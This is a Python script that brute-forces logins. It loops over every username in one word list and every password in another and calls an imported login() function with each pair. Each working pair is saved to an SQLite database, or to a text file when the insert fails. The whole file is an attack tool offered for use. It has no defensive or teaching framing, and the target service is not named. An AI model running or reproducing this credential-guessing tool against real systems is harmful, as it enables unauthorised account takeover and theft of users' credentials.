import argparse
import sqlite3
from os.path import isfile
from databaseHandler import dbFile, insertUser
from sessionHandler import login, checkResponse

argumentParser = argparse.ArgumentParser()
argumentParser.add_argument('--user', help='enter the user list file name, default = user', nargs='?', default='user')
argumentParser.add_argument('--password', help='enter the password list file name, default = pass', nargs='?', default='pass')
fileArgs = argumentParser.parse_args()

''' function to bruteforce using passed user list and password list '''
def brute(cursor, userlist, passlist, db):
	# Open user file list
	with open(userlist, 'r') as users:
		# Checking for every user
		for userid in users:
			print("Checking for user : "+str(userid))
			# Open password file list
			with open(passlist, 'r') as passwords:
				# Checking for everypassword
				for password in passwords:
					# Call login() with user and password
					checkLogin = login(userid.strip(), password.strip())

					# If login is successful the checkResponse() will return True other wise False
					if checkResponse(checkLogin, 0) is True:
						'''
						with open('success.txt', 'a') as file:
							file.write(str(userid.strip())+'-'+str(password.strip())+'\n')
						'''
						# If there is a problem inserting into database, write the username - password in a file
						if insertUser(cursor, userid.strip(), password.strip()) is False:
							with open('insert_error.txt', 'a') as file:
								file.write(str(userid.strip())+'-'+str(password.strip())+'\n')
						else:
							db.commit()


'''	
# Checking if default user and pass file exist
if isfile('user.txt') is True and isfile('pass.txt') is True:
	print("user.txt and pass.txt found, do you want to continue with these files?\n1 - Yes, 0 - No")
	# Take user input for choice
	choice = input()
	if choice == 1:
		db = sqlite3.connect(dbFile)
		cursor = db.cursor()
		brute(cursor, 'user.txt', 'pass.txt')
		db.commit()
		cursor.close()
	else:
		print("Please pass the user list and password list as arguments.\npy bruteforce.py --user <user list name> --password <password list name>\nNo need to add file extensions\n\nIf you don't have user list and password list generated, generate using genUser.py and genPass.py")
# User passed some values yay!!
'''

# Now check if file exists
if isfile(fileArgs.user+'.txt') is True and isfile(fileArgs.password+'.txt') is True:
	print(fileArgs.user+'.txt\t-\tPass')
	print(fileArgs.password+'.txt\t-\tPass')
	print("Starting Bruteforce")
	db = sqlite3.connect(dbFile)
	cursor = db.cursor()
	brute(cursor, fileArgs.user+'.txt', fileArgs.password+'.txt', db)
	cursor.close()
# File doesn't exist
else:
	print(fileArgs.user+'.txt\t-\tFail')
	print(fileArgs.password+'.txt\t-\tFail')
	print("Please check if the file exist in the relative directory.")